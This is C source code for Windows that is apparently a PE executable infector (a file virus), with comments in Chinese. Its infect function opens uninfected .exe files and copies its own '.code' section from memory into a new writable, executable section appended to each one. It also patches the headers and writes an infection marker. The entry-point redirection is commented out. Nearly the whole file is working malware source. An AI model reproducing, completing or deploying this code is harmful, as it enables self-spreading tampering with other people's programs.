#include "basetool.h"

//#define _DEBUG_H 

#define IMAGE_INFECTED_SINGNATURE 0x06060606
__forceinline BOOL setBytes(BYTE* dst, size_t size, long offset, HANDLE hFile)
{
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	else
	{
		SetFilePointer(hFile, offset, 0, 0);
		DWORD written = 0;
		BOOL r = WriteFile(hFile, dst, size, &written, NULL);
		if (!(r && written == size))
		{
			return false;
		}
		return true;
	}
}

__forceinline BOOL getBytes(BYTE* dst, size_t size, long offset, HANDLE hFile)
{
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	SetFilePointer(hFile, offset, 0, 0);
	DWORD read = 0;
	BOOL r = ReadFile(hFile, dst, size, &read, NULL);
	if (!(r && read == size))
	{
		return false;
	}
	return true;
}

__forceinline PE init_file(WCHAR* filename)
{
	PE p;
	HANDLE hFile = CreateFile(
		filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		p.status = FILE_FAILURE;
		return p;
	}
	p.hFile = hFile;


	// 判断文件是否已感染

	// DOS Header
	IMAGE_DOS_HEADER dos_header = get_IMAGE_DOS_HEADER(hFile);
	p.e_lfanew = dos_header.e_lfanew;
	_IMAGE_NT_HEADERS nt_header = get_IMAGE_NT_HEADER(hFile, p);

	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
	{
		CloseHandle(hFile);
		p.status = FILE_FAILURE;
		return p;
	}
	if (nt_header.Signature != IMAGE_NT_SIGNATURE)
	{
		CloseHandle(hFile);
		p.status = FILE_FAILURE;
		return p;
	}
	DWORD infectSignature;
	getBytes((BYTE*)&infectSignature, sizeof(DWORD), p.e_lfanew - sizeof(DWORD), hFile);
	if (infectSignature != 0)
	{
		CloseHandle(hFile);
		p.status = IS_INFECTED;
		return p;
	}

	// 未感染
	p.status = IS_NOT_INFECTED;
	wmemset(p.FILENAME, 0, 128);
	wmemcpy(p.FILENAME, filename, lstrlenW(filename));
	
	// Optional Header
	p.number_of_sections = nt_header.FileHeader.NumberOfSections;
	IMAGE_OPTIONAL_HEADER32 optional_header = nt_header.OptionalHeader;
	p.AddressOfEntry = optional_header.AddressOfEntryPoint;
	p.ImageBase = optional_header.ImageBase;
	p.ImageBase = optional_header.ImageBase;
	p.FileAlignment = optional_header.FileAlignment;
	p.SectionAlignment = optional_header.SectionAlignment;
	p.SizeOfImage = optional_header.SizeOfImage;

	get_IMAGE_SECTION_HEADERS(&p.section_headers, p.number_of_sections, p.e_lfanew, hFile);

	return p;
}

__forceinline void close_file(PE p)
{
	if (p.hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(p.hFile);
	}
}

void display(char* src, int len)
{
	for (int i = 0; i < len; i++)
	{
		unsigned char ch = 0;
		ch = src[i];
		printf("%0.2X ", ch);
	}
}

__forceinline IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(HANDLE hFile)
{
	char* buf = (char*)malloc(sizeof(IMAGE_DOS_HEADER));
	memset(buf, 0, sizeof(IMAGE_DOS_HEADER));
	getBytes((BYTE*)buf, sizeof(IMAGE_DOS_HEADER), 0, hFile);
	return (IMAGE_DOS_HEADER) * ((IMAGE_DOS_HEADER*)buf);
}

__forceinline _IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(HANDLE hFile, PE p)
{
	char* buf = (char*)malloc(sizeof(_IMAGE_NT_HEADERS));
	memset(buf, 0, sizeof(_IMAGE_NT_HEADERS));
	getBytes((BYTE*)buf, sizeof(_IMAGE_NT_HEADERS), p.e_lfanew, hFile);
	return (_IMAGE_NT_HEADERS) * ((_IMAGE_NT_HEADERS*)buf);
}

__forceinline void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER** dst, int cnt, LONG e_lfanew, HANDLE hFile)
{
	_IMAGE_SECTION_HEADER* header = (IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER) *cnt);
	long  offset = e_lfanew + sizeof(_IMAGE_NT_HEADERS);
	getBytes((BYTE*)header, sizeof(IMAGE_SECTION_HEADER) * cnt, offset, hFile);
	*dst = header;
	return;
}

__forceinline unsigned int rva_To_fa(unsigned int rva, PE p)
//将相对虚拟地址转为文件偏移地址
{
	unsigned int fa = 0;

	if (rva < (p.e_lfanew + sizeof(_IMAGE_NT_HEADERS) + p.number_of_sections * sizeof(IMAGE_SECTION_HEADER)))
		//rva还是在头部
	{
		return rva; // rva = fa
	}

	int i = 0;

	for (i = 0; i < (p.number_of_sections - 1); i++)
	{
		if (rva >= p.section_headers[i].VirtualAddress && rva < p.section_headers[i + 1].VirtualAddress)
			//找到rva所在的Section
		{
			break;
		}
	}
	int off = rva - p.section_headers[i].VirtualAddress;
	fa = p.section_headers[i].PointerToRawData + off;
	return fa;
}

__forceinline unsigned int fa_To_rva(unsigned int fa, PE p)
{
	unsigned int rva = 0;

	if (fa < p.e_lfanew + sizeof(_IMAGE_NT_HEADERS) + p.number_of_sections * sizeof(IMAGE_SECTION_HEADER))
		//fa还是在头部
	{
		return fa; // fa = rva
	}

	int i = 0;

	for (i = 0; i < (p.number_of_sections - 1); i++)
	{
		if (fa >= p.section_headers[i].PointerToRawData && fa < p.section_headers[i + 1].PointerToRawData)
			//夹在之间的,
		{
			break; // 找到对应的Section
		}
	}

	int off = fa - p.section_headers[i].PointerToRawData;
	rva = p.section_headers[i].VirtualAddress + off;
	return rva;
}

__forceinline unsigned int rva_to_va(unsigned int rva, PE p)
{
	return p.ImageBase + rva;
}

__forceinline unsigned int va_to_rva(unsigned int va, PE p)
{
	return va - p.ImageBase;
}

__forceinline IMAGE_IMPORT_DESCRIPTOR* get_IMAGE_IMPORT_DESCRIPTORS(int* cnt, HANDLE hFile, PE p)
{
	IMAGE_IMPORT_DESCRIPTOR* rst = NULL;
	_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER(hFile, p);
	int import_count = nth.OptionalHeader.DataDirectory[1].Size / 20;
	rst = (IMAGE_IMPORT_DESCRIPTOR*)malloc(sizeof(IMAGE_IMPORT_DESCRIPTOR) * import_count);
	getBytes((BYTE*)rst, sizeof(IMAGE_IMPORT_DESCRIPTOR) * import_count, rva_To_fa(nth.OptionalHeader.DataDirectory[1].VirtualAddress, p), hFile);
	if (cnt != NULL)
	{
		*cnt = import_count;
	}
	return rst;
}

__forceinline void change_AddressEntry(DWORD rva, HANDLE hFile, PE p)
{
	int offset = p.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD) +
		sizeof(BYTE) +
		sizeof(BYTE) +
		sizeof(DWORD) * 3;
	setBytes((BYTE*)&rva, sizeof(DWORD), offset, hFile);
}


int infect(WCHAR* filename)
//目标文件必须是未感染的exe文件感染代码
{
	PE p = init_file(filename);
	if (p.status != IS_NOT_INFECTED)
	{
		return 0;
	}

	LPVOID ImageBase = GetModuleBase(NULL);
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(dos_header->e_lfanew + DWORD(ImageBase));
	PIMAGE_SECTION_HEADER sec_header = NULL;
	int cnt = nt_header->FileHeader.NumberOfSections;
	char shell[] = ".code";
	for (int i = 0; i < cnt; i++)
	{
		 sec_header = (PIMAGE_SECTION_HEADER)(dos_header->e_lfanew + sizeof(*nt_header) + DWORD(ImageBase)+sizeof(*sec_header)*i);
		 if (_strcmpi((char*)(sec_header->Name), shell)==0)
		 {
			 break; // 定位到shell段
		 }
	}

	IMAGE_SECTION_HEADER new_header; // 新shell对应内容
	memcpy(&new_header, sec_header, sizeof(*sec_header)); // 复制内容

	//定位到节表的最后一个位置的文件偏移 fva,然后把这个转化为rva,写入到程序的入口点AddressOfEntry
	int sectionCnt = p.number_of_sections;
	DWORD newSection_fa = p.section_headers[sectionCnt - 1].PointerToRawData + p.section_headers[sectionCnt - 1].SizeOfRawData;
	DWORD newSection_rva = p.section_headers[sectionCnt - 1].VirtualAddress + p.section_headers[sectionCnt - 1].SizeOfRawData;

	if (newSection_rva % 0x1000 != 0)
	{
		newSection_rva = ((newSection_rva / 0x1000) + 1) * 0x1000;
	}
	new_header.VirtualAddress = newSection_rva; 
	new_header.PointerToRawData = newSection_fa;

	DWORD size = new_header.SizeOfRawData;

	BOOL r;
	//写入旧entrypoint 同时也是感染标识
	r = setBytes((BYTE*)&p.AddressOfEntry, sizeof(DWORD), p.e_lfanew - sizeof(DWORD), p.hFile); 

	// 增加sec_no
	WORD sec_no = p.number_of_sections + 1; 
	r = setBytes((BYTE*)&sec_no, sizeof(WORD), p.e_lfanew + sizeof(WORD)*3, p.hFile);

	// 修改ImageSize
	DWORD image_size = p.SizeOfImage + new_header.SizeOfRawData;
	r = setBytes((BYTE*)&image_size, sizeof(DWORD), p.e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + sizeof(DWORD) * 8 +sizeof(WORD)*12, p.hFile);

	// 写入新的section header
	new_header.Characteristics = 0xE00000E0; // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	r = setBytes((BYTE*)&new_header, sizeof(new_header), p.e_lfanew + sizeof(*nt_header) + sizeof(new_header) * sectionCnt, p.hFile);
	
	// 写入新的section
	// 先写实际有用的大小
	int remain = new_header.PointerToRawData;
	BYTE* shell_code = (BYTE*)(sec_header->VirtualAddress + DWORD(ImageBase)); // 读取运行程序内存
	r = setBytes(shell_code, new_header.Misc.VirtualSize, new_header.PointerToRawData, p.hFile);

	// 再补齐最后的0
	BYTE zeros[512] = { 0 };
	r = setBytes(zeros, new_header.SizeOfRawData - new_header.Misc.VirtualSize , new_header.PointerToRawData + new_header.Misc.VirtualSize, p.hFile);

	// 修改entrypoint
	//DWORD new_entry = new_header.VirtualAddress + 0x230;
	//r = setBytes((BYTE*)&(new_entry), sizeof(DWORD), p.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD) +
	//	sizeof(BYTE) +
	//	sizeof(BYTE) +
	//	sizeof(DWORD) * 3, p.hFile); // 写入AddressEntryPoint
	CloseHandle(p.hFile);
	free(p.section_headers);

	return 0;
}

